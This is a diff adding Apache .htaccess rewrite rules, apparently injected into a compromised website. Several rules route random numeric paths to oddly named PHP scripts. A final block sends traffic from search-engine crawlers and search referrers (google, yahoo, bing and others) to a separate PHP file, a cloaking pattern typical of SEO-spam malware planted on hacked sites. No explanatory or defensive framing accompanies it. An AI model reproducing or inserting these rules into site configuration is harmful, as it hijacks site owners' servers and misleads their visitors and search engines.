@@ -1,0 +1,20 @@
+RewriteEngine on
+RewriteRule ^5633215613/(.*)$ christoph-februaries.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^6218017693/(.*)$ clobbers-breadboxes.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^4441941851/(.*)$ destination-lind.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^2142470698/(.*)$ desist-backpacks.php [QSA,L]
+
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ appearer-defaulter.php?$1 [L]
+
